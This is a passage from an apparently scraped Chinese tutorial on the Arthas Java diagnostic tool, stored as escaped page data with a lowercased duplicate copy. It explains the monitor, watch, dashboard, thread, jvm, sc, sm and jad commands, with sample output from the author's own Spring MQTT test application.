\n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:13  com.cloud.mqtt.web.TestController  test    0      0        0     0.00        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:18  com.cloud.mqtt.web.TestController  test    0      0        0     0.00        0.00%            \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n我得类 com.cloud.mqtt.web.TestController ，方法为 test ，-c 5 得意思就是每 5 秒打印一次。\n\n\n# watch\n\nwatch 方法执行数据观测。\n参数说明：class（类名表达式匹配），method（方法名表达式匹配），express（观察表达式），condition-express（条件表达式），[b]（在方法调用之前观察），[e]（在方法异常之后观察），[s]（在方法返回之后观察），[f]（在方法结束之后 (正常返回和异常返回) 观察），[E]（开启正则表达式匹配，默认为通配符匹配），[x:]（指定输出结果的属性遍历深度，默认为 1）\n特别说明：\n\n * watch 命令定义了 4 个观察事件点，即 -b 方法调用前，-e 方法异常后，-s 方法返回后，-f 方法结束后\n * 4 个观察事件点 -b、-e、-s 默认关闭，-f 默认打开，当指定观察点被打开后，在相应事件点会对观察表达式进行求值并输出\n * 这里要注意方法入参和方法出参的区别，有可能在中间被修改导致前后不一致，除了 -b 事件点 params 代表方法入参外，其余事件都代表方法出参\n * 当使用 -b 时，由于观察事件点是在方法调用前，此时返回值或异常均不存在\n\ncurl "http://192.168.15.130:8087/test/?a=1&b=3" ，-x 2的意思是，是否深度解析参数，如果你的参数是一个对象，不深度解析，你看到的只是对象地址，深度解析的值，跟你参数所嵌套层数有关。\n$ watch com.cloud.mqtt.web.TestController  test "{params,returnObj}" -x 2\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 41 ms.\nts=2019-08-19 17:02:09; [cost=0.241819ms] result=@ArrayList[\n    @Object[][\n        @String[1],\n        @String[3],\n    ],\n    @String[13],\n]\n\n-b 意思是解析入参，-s解析出参， -n 2执行两次的意思，2次完则结束。结果的输出顺序和事件发生的先后顺序一致，和命令中 -s -b 的顺序无关。\n$ watch com.cloud.mqtt.web.TestController  test "{params,returnObj}" -x 2 -b  -s -n 2\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:06:21; [cost=0.006941ms] result=@ArrayList[\n    @Object[][\n        @String[1],\n        @String[3],\n    ],\n    null,\n]\nts=2019-08-19 17:06:21; [cost=0.945661ms] result=@ArrayList[\n    @Object[][\n        @String[1],\n        @String[3],\n    ],\n    @String[13],\n]\nCommand execution times exceed limit: 2, so command will exit. You can set it with -n option.\n\n条件表达式，第一个传参大于5才执行\n$ watch com.cloud.mqtt.web.TestController  test "{params[0],returnObj}" "params[0] > 5"\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 39 ms.\nts=2019-08-19 17:21:58; [cost=0.183399ms] result=@ArrayList[\n    @String[6],\n    @String[63],\n]\n\n异常信息举例：-e 表示抛出异常时才触发，express中，表示异常信息的变量是throwExp\n$ watch demo.MathGame primeFactors "{params[0],throwExp}" -e -x 2\nPress Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 62 ms.\nts=2018-12-03 19:38:00; [cost=1.414993ms] result=@ArrayList[\n    @Integer[-1120397038],\n    java.lang.IllegalArgumentException: number is: -1120397038, need >= 2\n    at demo.MathGame.primeFactors(MathGame.java:46)\n    at demo.MathGame.run(MathGame.java:24)\n    at demo.MathGame.main(MathGame.java:16),\n]\n\n按照耗时进行过滤：#cost>200(单位是ms)表示只有当耗时大于200ms时才会输出，过滤掉执行时间小于200ms的调用\n$ watch demo.MathGame primeFactors \'{params, returnObj}\' \'#cost>200\' -x 2\n$ watch demo.MathGame primeFactors \'{params, returnObj}\' \'#cost>200\' -x 2\nPress Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 66 ms.\nts=2018-12-03 19:40:28; [cost=2112.168897ms] result=@ArrayList[\n    @Object[][\n        @Integer[2141897465],\n    ],\n    @ArrayList[\n        @Integer[5],\n        @Integer[428379493],\n    ],\n]\n\n观察当前对象中的属性：如果想查看方法运行前后，当前对象中的属性，可以使用target关键字，代表当前对象，然后使用target.field_name访问当前对象的某个属性\n$ watch com.cloud.mqtt.web.TestController  test \'target\'\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 47 ms.\nts=2019-08-19 17:27:09; [cost=0.450697ms] result=@TestController[\n    mqttGateway=@$Proxy65[gateway proxy for service interface [interface com.cloud.mqtt.web.MqttGateway]],\n]\n\n$ watch com.cloud.mqtt.web.TestController  test \'target.mqttGateway\'\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:28:31; [cost=0.352704ms] result=@$Proxy65[\n    m1=@Method[public boolean java.lang.Object.equals(java.lang.Object)],\n    m10=@Method[public abstract boolean org.springframework.aop.framework.Advised.isExposeProxy()],\n    m13=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvisor(org.springframework.aop.Advisor) throws org.springframework.aop.framework.AopConfigException],\n    m7=@Method[public abstract boolean org.springframework.aop.framework.Advised.isProxyTargetClass()],\n    m15=@Method[public abstract void org.springframework.aop.framework.Advised.removeAdvisor(int) throws org.springframework.aop.framework.AopConfigException],\n    m23=@Method[public abstract java.lang.Class[] org.springframework.aop.framework.Advised.getProxiedInterfaces()],\n    m5=@Method[public abstract int org.springframework.aop.framework.Advised.indexOf(org.springframework.aop.Advisor)],\n    m22=@Method[public abstract org.springframework.aop.TargetSource org.springframework.aop.framework.Advised.getTargetSource()],\n    m18=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvice(int,org.aopalliance.aop.Advice) throws org.springframework.aop.framework.AopConfigException],\n    m19=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvice(org.aopalliance.aop.Advice) throws org.springframework.aop.framework.AopConfigException],\n    m0=@Method[public native int java.lang.Object.hashCode()],\n    m24=@Method[public abstract boolean org.springframework.aop.framework.Advised.isInterfaceProxied(java.lang.Class)],\n    m20=@Method[public abstract boolean org.springframework.aop.framework.Advised.removeAdvice(org.aopalliance.aop.Advice)],\n    m9=@Method[public abstract void org.springframework.aop.framework.Advised.setExposeProxy(boolean)],\n    m8=@Method[public abstract void org.springframework.aop.framework.Advised.setTargetSource(org.springframework.aop.TargetSource)],\n    m2=@Method[public java.lang.String java.lang.Object.toString()],\n    m26=@Method[public abstract java.lang.Class org.springframework.aop.TargetClassAware.getTargetClass()],\n    m14=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvisor(int,org.springframework.aop.Advisor) throws org.springframework.aop.framework.AopConfigException],\n    m27=@Method[public abstract java.lang.Class org.springframework.core.DecoratingProxy.getDecoratedClass()],\n    m16=@Method[public abstract boolean org.springframework.aop.framework.Advised.removeAdvisor(org.springframework.aop.Advisor)],\n    m4=@Method[public abstract int org.springframework.aop.framework.Advised.indexOf(org.aopalliance.aop.Advice)],\n    m6=@Method[public abstract boolean org.springframework.aop.framework.Advised.isFrozen()],\n    m17=@Method[public abstract boolean org.springframework.aop.framework.Advised.replaceAdvisor(org.springframework.aop.Advisor,org.springframework.aop.Advisor) throws org.springframework.aop.framework.AopConfigException],\n    m11=@Method[public abstract void org.springframework.aop.framework.Advised.setPreFiltered(boolean)],\n    m3=@Method[public abstract void com.cloud.mqtt.web.MqttGateway.sendToMqtt(java.lang.String,java.lang.String)],\n    m21=@Method[public abstract java.lang.String org.springframework.aop.framework.Advised.toProxyConfigString()],\n    m25=@Method[public abstract org.springframework.aop.Advisor[] org.springframework.aop.framework.Advised.getAdvisors()],\n    m12=@Method[public abstract boolean org.springframework.aop.framework.Advised.isPreFiltered()],\n]\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n',normalizedContent:'# arthas 是什么？\n\narthas 是 alibaba 开发得一款 java 诊断工具，可以帮我们查看 jvm 使用情况，查看线程数，排除阻塞线程；监听类和方法得调用次数，失败次数 (失败率)，执行时常；监听方法得入参，出参，异常信息；快速反编译查看源码，并修改源码，编译运行；查看堆栈信息等。\n\n\n# 这里列出一些常用命令并一一讲解\n\n最常用得命令：dashboard，thread，jvm，sc，sm，jad，mc，redefine，monitor，watch。官方地址：https://arthas.aliyun.com/\n\n\n# dashboard\n\n\n\ndashboard 当前系统的实时数据面板，按 ctrl+c 退出，当运行在 ali-tomcat 时，会显示当前 tomcat 的实时信息，如 http 请求的 qps, rt, 错误数，线程池信息等等。\n数据说明如下：\n\n * id: java 级别的线程 id，注意这个 id 不能跟 jstack 中的 nativeid 一一对应\n * name: 线程名\n * group: 线程组名\n * priority: 线程优先级，1~10 之间的数字，越大表示优先级越高\n * state: 线程的状态\n * cpu%: 线程消耗的 cpu 占比，采样 100ms，将所有线程在这 100ms 内的 cpu 使用量求和，再算出每个线程的 cpu 使用占比。\n * time: 线程运行总时间，数据格式为 分：秒\n * interrupted: 线程当前的中断位状态\n * daemon: 是否是守护线程\n\n\n# thread\n\n查看当前线程信息，查看线程的堆栈\n示例： thread -n 3 找出前 3 个线程的堆栈信息\n\n * id 线程 id;\n * -n 指定最忙的前 n 个线程并打印堆栈；\n * -b 找出当前阻塞其他线程的线程；\n * -i <value> 指定 cpu 占比统计的采样间隔单位为毫秒，建议 5000\n\n$ thread -n 3\n"as-command-execute-daemon" id=58 cpuusage=76% runnable\n    at java.management@12.0.1/sun.management.threadimpl.dumpthreads0(native method)\n    at java.management@12.0.1/sun.management.threadimpl.getthreadinfo(threadimpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.processtopbusythreads(threadcommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.process(threadcommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.process(annotatedcommandimpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.access$100(annotatedcommandimpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.processimpl$commandprocesstask.run(processimpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n    number of locked synchronizers = 1\n    - java.util.concurrent.threadpoolexecutor$worker@7808db3c\n\n\n"nioblockingselector.blockpoller-1" id=24 cpuusage=17% runnable (in native)\n    at java.base@12.0.1/sun.nio.ch.epoll.wait(native method)\n    at java.base@12.0.1/sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:124)\n    -  locked sun.nio.ch.util$2@1a574b17\n    -  locked sun.nio.ch.epollselectorimpl@7b0d44f5\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.select(selectorimpl.java:136)\n    at org.apache.tomcat.util.net.nioblockingselector$blockpoller.run(nioblockingselector.java:304)\n\n\n"http-nio-8087-clientpoller-1" id=36 cpuusage=5% runnable (in native)\n    at java.base@12.0.1/sun.nio.ch.epoll.wait(native method)\n    at java.base@12.0.1/sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:124)\n    -  locked sun.nio.ch.util$2@703ba4c0\n    -  locked sun.nio.ch.epollselectorimpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.select(selectorimpl.java:136)\n    at org.apache.tomcat.util.net.nioendpoint$poller.run(nioendpoint.java:743)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n\naffect(row-cnt:0) cost in 131 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n示例：thread 打出所有运行线程\n\n$ thread\nthreads total: 37, new: 0, runnable: 14, blocked: 0, waiting: 17, timed_waiting: 6, terminated: 0                                                                                                                                       \nid                 name                                                      group                                  priority           state               %cpu               time               interrupted         daemon             \n59                 as-command-execute-daemon                                 system                                 10                 runnable            100                0:0                false               true               \n42                 asyncappender-worker-arthas-cache.result.asyncappender    system                                 9                  waiting             0                  0:0                false               true               \n40                 attach listener                                           system                                 9                  runnable            0                  0:0                false               true               \n14                 catalina-utility-1                                        main                                   1                  waiting             0                  0:1                false               false              \n15                 catalina-utility-2                                        main                                   1                  timed_waiting       0                  0:0                false               false              \n10                 common-cleaner                                            innocuousthreadgroup                   8                  timed_waiting       0                  0:0                false               true               \n39                 destroyjavavm                                             main                                   5                  runnable            0                  0:12               false               false              \n3                  finalizer                                                 system                                 8                  waiting             0                  0:0                false               true               \n19                 mqtt call: mqttid_inbound                                 main                                   5                  waiting             0                  0:0                false               false              \n23                 mqtt ping: mqttid_inbound                                 main                                   5                  timed_waiting       0                  0:0                false               false              \n20                 mqtt rec: mqttid_inbound                                  main                                   5                  runnable            0                  0:0                false               false              \n21                 mqtt snd: mqttid_inbound                                  main                                   5                  waiting             0                  0:0                false               false              \n24                 nioblockingselector.blockpoller-1                         main                                   5                  runnable            0                  0:0                false               true               \n2                  reference handler                                         system                                 10                 runnable            0                  0:0                false               true               \n4                  signal dispatcher                                         system                                 9                  runnable            0                  0:0                false               true               \n16                 container-0                                               main                                   5                  timed_waiting       0                  0:0                false               false              \n37                 http-nio-8087-acceptor-0                                  main                                   5                  runnable            0                  0:0                false               true               \n35                 http-nio-8087-clientpoller-0                              main                                   5                  runnable            0                  0:0                false               true               \n36                 http-nio-8087-clientpoller-1                              main                                   5                  runnable            0                  0:0                false               true               \n25                 http-nio-8087-exec-1                                      main                                   5                  waiting             0                  0:0                false               true               \n34                 http-nio-8087-exec-10                                     main                                   5                  waiting             0                  0:0                false               true               \n26                 http-nio-8087-exec-2                                      main                                   5                  waiting             0                  0:0                false               true               \n27                 http-nio-8087-exec-3                                      main                                   5                  waiting             0                  0:0                false               true               \n28                 http-nio-8087-exec-4                                      main                                   5                  waiting             0                  0:0                false               true               \n29                 http-nio-8087-exec-5                                      main                                   5                  waiting             0                  0:0                false               true               \n30                 http-nio-8087-exec-6                                      main                                   5                  waiting             0                  0:0                false               true               \n31                 http-nio-8087-exec-7                                      main                                   5                  waiting             0                  0:0                false               true               \n32                 http-nio-8087-exec-8                                      main                                   5                  waiting             0                  0:0                false               true               \n33                 http-nio-8087-exec-9                                      main                                   5                  waiting             0                  0:0                false               true               \n44                 job-timeout                                               system                                 9                  timed_waiting       0                  0:0                false               true               \n45                 nioeventloopgroup-2-1                                     system                                 10                 runnable            0                  0:0                false               false              \n49                 nioeventloopgroup-2-2                                     system                                 10                 runnable            0                  0:1                false               false              \n53                 nioeventloopgroup-2-3                                     system                                 10                 runnable            0                  0:0                false               false              \n46                 nioeventloopgroup-3-1                                     system                                 10                 runnable            0                  0:0                false               false              \n22                 pool-2-thread-4                                           main                                   5                  waiting             0                  0:0                false               false              \n47                 pool-3-thread-1                                           system                                 5                  timed_waiting       0                  0:0                false               false              \n48                 pool-4-thread-1                                           system                                 5                  waiting             0                  0:0                false               false              \naffect(row-cnt:0) cost in 113 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n示例：thread 20 查看线程 id 为 20 的堆栈信息\n\n$ thread 20\n"mqtt rec: mqttid_inbound" id=20 runnable (in native)\n    at java.base@12.0.1/java.net.socketinputstream.socketread0(native method)\n    at java.base@12.0.1/java.net.socketinputstream.socketread(socketinputstream.java:115)\n    at java.base@12.0.1/java.net.socketinputstream.read(socketinputstream.java:168)\n    at java.base@12.0.1/java.net.socketinputstream.read(socketinputstream.java:140)\n    at java.base@12.0.1/java.net.socketinputstream.read(socketinputstream.java:200)\n    at java.base@12.0.1/java.io.datainputstream.readbyte(datainputstream.java:270)\n    at org.eclipse.paho.client.mqttv3.internal.wire.mqttinputstream.readmqttwiremessage(mqttinputstream.java:92)\n    at org.eclipse.paho.client.mqttv3.internal.commsreceiver.run(commsreceiver.java:133)\n    at java.base@12.0.1/java.util.concurrent.executors$runnableadapter.call(executors.java:515)\n    at java.base@12.0.1/java.util.concurrent.futuretask.run(futuretask.java:264)\n    at java.base@12.0.1/java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.run(scheduledthreadpoolexecutor.java:304)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n    number of locked synchronizers = 1\n    - java.util.concurrent.threadpoolexecutor$worker@79cf8c25\n\naffect(row-cnt:0) cost in 33 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n示例：thread -b 找出阻塞其他线程的线程\n\n$ thread -b\nno most blocking thread found!\naffect(row-cnt:0) cost in 43 ms.\n\n\n1\n2\n3\n\n\n示例：thread -n 3 -i 5000 阻塞指定 5 秒后收到前 3 线程的堆栈信息\n\n$ thread -n 3  -i 5000\n"catalina-utility-1" id=14 cpuusage=21% timed_waiting on java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject@72b49c8\n    at java.base@12.0.1/jdk.internal.misc.unsafe.park(native method)\n    -  waiting on java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject@72b49c8\n    at java.base@12.0.1/java.util.concurrent.locks.locksupport.parknanos(locksupport.java:235)\n    at java.base@12.0.1/java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2123)\n    at java.base@12.0.1/java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1182)\n    at java.base@12.0.1/java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:899)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1054)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1114)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n\n"http-nio-8087-clientpoller-1" id=36 cpuusage=14% runnable (in native)\n    at java.base@12.0.1/sun.nio.ch.epoll.wait(native method)\n    at java.base@12.0.1/sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:124)\n    -  locked sun.nio.ch.util$2@703ba4c0\n    -  locked sun.nio.ch.epollselectorimpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.select(selectorimpl.java:136)\n    at org.apache.tomcat.util.net.nioendpoint$poller.run(nioendpoint.java:743)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n\n"as-command-execute-daemon" id=62 cpuusage=10% runnable\n    at java.management@12.0.1/sun.management.threadimpl.dumpthreads0(native method)\n    at java.management@12.0.1/sun.management.threadimpl.getthreadinfo(threadimpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.processtopbusythreads(threadcommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.process(threadcommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.process(annotatedcommandimpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.access$100(annotatedcommandimpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.processimpl$commandprocesstask.run(processimpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n    number of locked synchronizers = 1\n    - java.util.concurrent.threadpoolexecutor$worker@2d2909be\n\n\naffect(row-cnt:0) cost in 5045 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# jvm\n\n查看当前 jvm 信息，这里只拿部分信息来说\n\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n thread                                                                                                                                                                                                                                 \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n count                                                             37                                                                                                                                                                   \n daemon-count                                                      22                                                                                                                                                                   \n peak-count                                                        38                                                                                                                                                                   \n started-count                                                     55                                                                                                                                                                   \n deadlock-count                                                    0                                                                                                                                                                    \n                                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n file-descriptor                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n max-file-descriptor-count                                         -1                                                                                                                                                                   \n open-file-descriptor-count                                        -1         \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nthread 相关\n\n * count: jvm 当前活跃的线程数\n * daemon-count: jvm 当前活跃的守护线程数\n * peak-count: 从 jvm 启动开始曾经活着的最大线程数\n * started-count: 从 jvm 启动开始总共启动过的线程次数\n * deadlock-count: jvm 当前死锁的线程数\n\nfile-descriptor 相关\n\n * max-file-descriptor-count：jvm 进程最大可以打开的文件描述符数\n * open-file-descriptor-count：jvm 当前打开的文件描述符数\n\n\n# sc\n\n查看 jvm 已加载的类信息，\n参数说明：lass（包名 + 类名），method（方法名），[d]（输出详细信息），[e]（开启正则表达式匹配，默认为通配符匹配），[f]（输出当前类的成员变量信息（需要配合参数 - d 一起使用）），[x:]（指定输出静态变量时属性的遍历深度，默认为 0，即直接使用 tostring 输出）\nclass-pattern 支持全限定名，如 com.taobao.test.aaa，也支持 com/taobao/test/aaa 这样的格式，这样，我们从异常堆栈里面把类名拷贝过来的时候，不需要在手动把 / 替换为。啦。\n示例：sc com.cloud*\n\n$ sc com.cloud*\ncom.cloud.mqtt.mqttapplication\ncom.cloud.mqtt.mqttapplication$$enhancerbyspringcglib$$b4fbeb8a\ncom.cloud.mqtt.mqtt.mqttconfig\ncom.cloud.mqtt.mqtt.mqttconfig$$enhancerbyspringcglib$$d1953d4e\ncom.cloud.mqtt.mqtt.mqttconfig$$enhancerbyspringcglib$$d1953d4e$$fastclassbyspringcglib$$69e081d8\ncom.cloud.mqtt.mqtt.mqttconfig$$fastclassbyspringcglib$$bf72748c\ncom.cloud.mqtt.mqtt.mqttconfig$1\ncom.cloud.mqtt.mqtt.mqttreceiveconfig\ncom.cloud.mqtt.mqtt.mqttreceiveconfig$$enhancerbyspringcglib$$5631a71d\ncom.cloud.mqtt.mqtt.mqttsenderconfig\ncom.cloud.mqtt.mqtt.mqttsenderconfig$$enhancerbyspringcglib$$3bfb2a03\ncom.cloud.mqtt.mqtt.publisher\ncom.cloud.mqtt.web.mqttgateway\ncom.cloud.mqtt.web.testcontroller\ncom.sun.proxy.$proxy65\naffect(row-cnt:15) cost in 20 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n示例：sc -d -f com.cloud.mqtt.web.testcontroller 打印类的信息以及字段的信息\n\n$ sc -d -f com.cloud.mqtt.web.testcontroller\n class-info        com.cloud.mqtt.web.testcontroller                                                                                                                                                                                    \n code-source       file:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/boot-inf/classes!/                                                                                                                                                 \n name              com.cloud.mqtt.web.testcontroller                                                                                                                                                                                    \n isinterface       false                                                                                                                                                                                                                \n isannotation      false                                                                                                                                                                                                                \n isenum            false                                                                                                                                                                                                                \n isanonymousclass  false                                                                                                                                                                                                                \n isarray           false                                                                                                                                                                                                                \n islocalclass      false                                                                                                                                                                                                                \n ismemberclass     false                                                                                                                                                                                                                \n isprimitive       false                                                                                                                                                                                                                \n issynthetic       false                                                                                                                                                                                                                \n simple-name       testcontroller                                                                                                                                                                                                       \n modifier          public                                                                                                                                                                                                               \n annotation        org.springframework.web.bind.annotation.restcontroller,org.springframework.web.bind.annotation.requestmapping                                                                                                        \n interfaces                                                                                                                                                                                                                             \n super-class       +-java.lang.object                                                                                                                                                                                                   \n class-loader      +-org.springframework.boot.loader.launchedurlclassloader@439f5b3d                                                                                                                                                    \n                     +-jdk.internal.loader.classloaders$appclassloader@5bc2b487                                                                                                                                                         \n                       +-jdk.internal.loader.classloaders$platformclassloader@75d2da2d                                                                                                                                                  \n classloaderhash   439f5b3d                                                                                                                                                                                                             \n fields            modifier  private                                                                                                                                                                                                    \n                   type      com.cloud.mqtt.web.mqttgateway                                                                                                                                                                                                      \n                   name      mqttgateway                                                                                                                                                                                                \n                   annotationjavax.annotation.resource                                                                                                                                                                                  \n                                                                                                                                                                                                                                        \n\naffect(row-cnt:1) cost in 15 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# sm\n\n查看已加载类的方法信息，命令只能看到由当前类所声明 (declaring) 的方法，父类则无法看到。\n参数说明：class（包名 + 类名），method（方法名称），[d]（展示每个方法的详细信息），[e]（开启正则表达式匹配，默认为通配符匹配）\n示例：sm com.cloud.mqtt.web.testcontroller 查询 testcontroller 下的所有方法\n\n$ sm  com.cloud.mqtt.web.testcontroller\ncom.cloud.mqtt.web.testcontroller <init>()v\ncom.cloud.mqtt.web.testcontroller test(ljava/lang/string;ljava/lang/string;)ljava/lang/string;\ncom.cloud.mqtt.web.testcontroller sendmqtt(ljava/lang/string;ljava/lang/string;)ljava/lang/string;\ncom.cloud.mqtt.web.testcontroller sendtest(ljava/lang/string;ljava/lang/string;)ljava/lang/string;\naffect(row-cnt:4) cost in 12 ms.\n\n\n1\n2\n3\n4\n5\n6\n\n\n示例：sm -d com.cloud.mqtt.web.testcontroller test 查询 testcontroller 下的 test 方法详情\n\n$ sm -d com.cloud.mqtt.web.testcontroller test\n declaring-class  com.cloud.mqtt.web.testcontroller                                                                                                                                                                                     \n method-name      test                                                                                                                                                                                                                  \n modifier         public                                                                                                                                                                                                                \n annotation       org.springframework.web.bind.annotation.getmapping                                                                                                                                                                    \n parameters       java.lang.string                                                                                                                                                                                                      \n                  java.lang.string                                                                                                                                                                                                      \n return           java.lang.string                                                                                                                                                                                                      \n exceptions                                                                                                                                                                                                                             \n\naffect(row-cnt:1) cost in 13 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# jad\n\njad 反编译指定已加载类得源码，jad 在 arthas console 上，反编译出来得源码是带语法高亮得，阅读方便，当然反编译出来得 java 代码可能会存在语法错误，但不影响你的进行阅读。\n参数说明：class（包名 + 类名），[c:]（类所属 classloader 得 hashcode），[e]（开启正则表达匹配，默认通配符）\n示例：反编译 com.cloud.mqtt.web.testcontroller\n\n$ jad com.cloud.mqtt.web.testcontroller\n\nclassloader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.launchedurlclassloader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.classloaders$appclassloader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.classloaders$platformclassloader@75d2da2d                                                                                                                                                                     \n\nlocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/boot-inf/classes!/                                                                                                                                                                    \n\n/*\n * decompiled with cfr 0_132.\n * \n * could not load the following classes:\n *  com.cloud.mqtt.web.mqttgateway\n *  javax.annotation.resource\n *  org.springframework.web.bind.annotation.getmapping\n *  